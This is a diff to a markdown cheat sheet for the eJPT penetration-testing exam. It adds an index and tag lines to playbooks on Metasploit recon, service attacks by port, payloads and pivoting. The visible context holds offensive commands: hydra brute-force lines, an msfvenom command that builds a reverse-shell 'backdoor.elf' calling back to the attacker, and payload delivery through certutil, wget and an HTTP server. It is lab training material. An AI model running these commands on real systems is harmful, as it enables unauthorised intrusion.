@@ -1,7 +1,42 @@
+## Quick Index
+
+- Global Strategy
+  - [Summary](#summary)
+  - [Before the Beginning (48h OODA)](#before-the-beginning)
+- Recon & Scanning
+  - [Metasploit init & verify](#metasploit-framework-initiation-and-verification-workflow)
+  - [Host discovery](#host-discovery)
+  - [Port/service scanning](#service-and-port-scanning)
+  - [Import Nmap → MSF](#import-nmap-results-into-metasploit)
+  - [Recon troubleshooting (OODA)](#the-ooda-loop-in-the-reconnaissance-phase-troubleshooting)
+- Service Playbooks
+  - [FTP (21)](#port-21-ftp)
+  - [SSH (22)](#port-22-ssh)
+  - [HTTP/S (80/443)](#port-80443-https)
+  - [SMB (139/445)](#port-139445-smb)
+  - [MySQL (3306)](#port-3306-mysql)
+- Payloads
+  - [MSFVenom generation](#msfvenom-payloads-generation)
+  - [Built-in payloads on Kali](#built-in-payloads-on-kali)
+  - [Delivery (HTTP/SMB/FTP)](#payload-delivery)
+  - [Payload troubleshooting (OODA)](#the-ooda-loop-in-the-exploitation-phase-troubleshooting)
+- Post-Exploitation
+  - [Primary triage](#primary-triage)
+  - [MSF quick triage modules](#post-exploitation)
+  - [PrivEsc: Linux](#privilege-escalation-execution)
+  - [PrivEsc: Windows](#privilege-escalation-execution)
+  - [Post-exploitation OODA](#the-ooda-loop-in-the-post-exploitation-phase)
+- Pivoting
+  - [Pivoting & lateral movement](#pivoting-and-lateral-movement)
+
+[Back to Index](#quick-index)
+
 # Summary
 This strategic guide provides mandatory protocols for the exam's unique constraints and uses OODA-based troubleshooting loops to follow best-practice operations and overcome common "stuck" points in reconnaissance, exploitation, and pivoting.
 
 # Before the Beginning
+
+[Back to Index](#quick-index)
 
 This section provides a high-level OODA loop to guide the entire 48-hour examination.
 
@@ -30,6 +65,8 @@ This section provides a high-level OODA loop to guide the entire 48-hour examina
 | Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |
 
 # Tactical Deployment and Reconnaissance
+
+[Back to Index](#quick-index)
 
 ## Metasploit Framework Initiation and Verification Workflow
 
@@ -81,7 +118,12 @@ msf6 > setg RHOST <target_ip>
 
 # Attack Playbook (Enumeration and Exploitation)
 
+[Back to Index](#quick-index)
+
 ## Port 21: FTP
+
+USE: When anonymous login allows write or vulnerable banners are present (vsftpd 2.3.4, ProFTPD 1.3.3c); fallback to brute force when needed.
+TAGS: ftp, anonymous, write, put, vsftpd, proftpd, hydra
 
 ### Scan
 
@@ -120,6 +162,9 @@ msf6 > use auxiliary/scanner/ftp/anonymous
 
 ## Port 22: SSH
 
+USE: Check for libssh bypass; otherwise consider brute force with known user lists.
+TAGS: ssh, libssh, hydra, brute
+
 ### Scan
 
 ```bash
@@ -144,6 +189,9 @@ nc -nv <target_ip> 22
   ```
 
 ## Port 80/443: HTTP/S
+
+USE: Enumerate dirs/CMS/WebDAV; test LFI/RFI/command injection; apply service-specific exploits.
+TAGS: http, https, gobuster, wpscan, webdav, lfi, rfi, shellshock, hydra
 
 ### Scan
 
@@ -248,6 +296,9 @@ hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \"/login.php:username=^
 
 ## Port 139/445: SMB
 
+USE: Enumerate shares/users; exploit anonymous write or version-specific vulns; psexec on admin creds.
+TAGS: smb, smbclient, smbmap, enum4linux, psexec, hydra
+
 ### Scan
 
 ```bash
@@ -311,6 +362,9 @@ hydra -L <user_file> -P <password_file> //<target_ip> smb
 
 ## Port 3306: MySQL
 
+USE: Confirm service, then attempt credential brute force.
+TAGS: mysql, hydra, db, brute
+
 ### Scan
 
 ```bash
@@ -327,6 +381,8 @@ hydra -L <user_file> -P <password_file> //<target_ip> mysql
 
 ### MSFVenom Payloads Generation
 
+TAGS: msfvenom, payload, windows, linux, reverse_tcp, stageless
+
 - Linux (ELF)
   ```bash
   msfvenom -p linux/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
@@ -337,6 +393,8 @@ hydra -L <user_file> -P <password_file> //<target_ip> mysql
   ```
 
 ### Built-in Payloads on Kali
+
+TAGS: webshell, php, aspx, jsp, nc.exe, windows-resources
 
 Kali ships ready-to-use web shells and binaries under /usr/share. Below are the most exam-relevant items.
 
@@ -398,6 +456,8 @@ Kali ships ready-to-use web shells and binaries under /usr/share. Below are the 
 
 ### Payload Delivery
 
+TAGS: delivery, http, smb, ftp, certutil, wget, python-http-server
+
 - HTTP server on attacker
   ```bash
   python3 -m http.server 8080
@@ -426,6 +486,8 @@ Kali ships ready-to-use web shells and binaries under /usr/share. Below are the 
   ```
 
 ## The OODA Loop in the Exploitation Phase (Troubleshooting)
+
+> Tip: When in doubt: switch to stageless, default to x86, and try reverse ports 80/443 before considering bind shells.
 
 ### Issue 1 Payload Failed
 
@@ -469,6 +531,8 @@ This uses the stable shell (Session 1) to upload and run a new Meterpreter paylo
 - Act: Halt. Shift focus to another open port on the same machine. Alternatively, move to an entirely different machine. Maybe return later.
 
 # Post Exploitation
+
+[Back to Index](#quick-index)
 
 The superiority of manual enumeration: Regardless, the manually curated enumeration lists within this handbook remain the preferred approach. They are precise, targeted, and directly map to known privilege escalation vectors within eJPT. During examinations, executing these 10-15 manual commands typically proves more efficient than sifting through automated script outputs.
 
@@ -625,6 +689,11 @@ Automatical Enumeration Tools:
 
 # Pivoting and Lateral Movement
 
+[Back to Index](#quick-index)
+
+USE: When a foothold shows dual NICs; route traffic to internal subnets or relay shells back.
+TAGS: pivot, autoroute, socks, proxychains, portfwd, bind_tcp, reverse_tcp
+
 Pivoting/lateral movement is the most challenging aspect of eJPT v2 and the stage where the highest number of candidates encounter failure.
 
 **Trigger**: Execute commands `ipconfig` (Windows) or `ipa` (Linux) on the initial shell (‘PivotBox’) during Local Enumeration/Discovery.
@@ -710,7 +779,7 @@ Pivoting/lateral movement is the most challenging aspect of eJPT v2 and the stag
 
   - Orient: `autoroute` has been configured, but the exploit module is unable to gain a shell.
   - Decide:
-  
+
     **Core logic**: `autoroute` permits the attack machine (Kali) to connect to internal targets, but it does not permit internal targets to connect back to the attack machine.
     - Orient: Using the `reverse_tcp` payload to run the Exploit module succeeded, but the shell promptly terminated.
     - Orient: The target attempted to reconnect to the attack machine, but it lacked the routing to the attack machine's network.
